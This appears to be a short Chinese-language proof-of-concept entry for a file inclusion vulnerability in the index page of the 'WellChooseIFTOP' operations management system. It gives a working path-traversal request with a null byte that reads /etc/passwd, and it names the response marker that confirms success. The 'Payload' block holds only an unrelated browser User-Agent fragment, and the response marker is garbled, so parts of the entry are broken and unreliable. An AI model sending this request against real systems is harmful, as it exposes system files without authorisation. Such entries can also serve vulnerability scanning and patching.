# WellChooseIFTOP企业运维管理系统indexpage存在文件包含漏洞

WellChooseIFTOP ｜ 文件包含 ｜ —
- **请求**：`GET /index.php?page=../../etc/passwd%00 HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 rootx: